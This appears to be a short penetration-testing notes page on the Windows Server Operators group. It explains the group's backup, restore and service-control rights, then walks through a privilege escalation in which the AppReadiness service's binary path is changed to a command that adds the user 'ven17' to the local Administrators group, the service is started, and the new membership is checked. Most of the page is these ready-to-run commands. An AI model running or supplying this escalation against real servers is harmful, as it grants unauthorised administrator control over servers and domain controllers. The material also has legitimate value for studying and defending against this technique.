# Server Operators

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**Server Operators**</mark> group allows members to <mark style="color:purple;">**administer Windows servers**</mark> without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful <mark style="color:green;">`SeBackupPrivilege`</mark> and <mark style="color:green;">`SeRestorePrivilege`</mark> privileges and the ability to control local services.

As example we would use **AppReadiness** service because it has high privileges and starts as SYSTEM. But method could be used against other services too.

#### Querying the Service

```powershell
C:\> sc.exe qc AppReadiness
```

#### Checking Service Permissions with PsService

```powershell
C:\> c:\Tools\PsService.exe security AppReadiness
```

#### Modifying the Service Binary Path

```powershell
C:\> sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators ven17 /add"
```

```powershell
C:\> sc.exe start AppReadiness
```

#### Confirming Local Admin Group Membership

```powershell
C:\> net localgroup Administrators
```
